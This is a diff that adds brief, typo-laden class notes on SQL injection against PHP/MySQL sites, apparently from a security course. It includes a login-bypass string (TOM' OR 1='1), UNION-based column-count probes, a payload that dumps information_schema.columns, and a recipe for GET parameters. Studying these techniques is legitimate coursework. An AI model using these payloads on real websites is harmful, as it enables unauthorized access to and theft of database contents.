@@ -1,0 +1,39 @@
+Structured Query Language:
+
+	Important commands for class:
+
+		SELECT: Extracts data from a database 
+
+		UNION: Used to combine the result-set of two or more SELECT statements
+
+Default databases:
+
+	Information_schema
+
+	mysql
+
+	performance_schema - preformance metrics
+
+Inside of databases are tables
+
+Inside of a table you have columns
+
+behind the .php make sure to put a ?
+
+TOM' OR 1='1 in the username or password field 
+
+Try to get a true statments so the server just gives you all the information 
+
+Audi' UNION select 1,2,3,4# used to test the number of columns
+-----------------------------------------------------------------------------------------------------
+Important Statment - select table_schema,x,table_name,column_name,5 FROM information_schema.columns#
+-----------------------------------------------------------------------------------------------------
+table_schema hold databases
+
+table_name holds tables
+
+column-name holds columns
+
+for get request test wit blank=# or 1 = 1
+then UNION selecet #,#,# till you fins the correct number
+
